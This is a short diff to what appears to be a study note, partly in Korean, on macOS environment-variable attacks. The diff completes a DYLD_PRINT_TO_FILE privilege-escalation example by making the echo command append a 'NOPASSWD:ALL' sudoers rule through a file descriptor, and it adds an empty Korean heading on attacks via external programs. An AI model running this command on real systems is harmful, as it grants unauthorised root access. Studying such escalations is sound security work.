@@ -130,5 +130,7 @@ LD_MYOWN = my own value
 $ DYLD_PRINT_TO_FILE = /etc/sudoers
 $ su bob
 password:
-$ echo "bob ALL = (ALL)"
+$ echo "bob ALL = (ALL) NOPASSWD:ALL" >& 3
 ```
+- 외부 프로그램을 통한 공격
+	- 
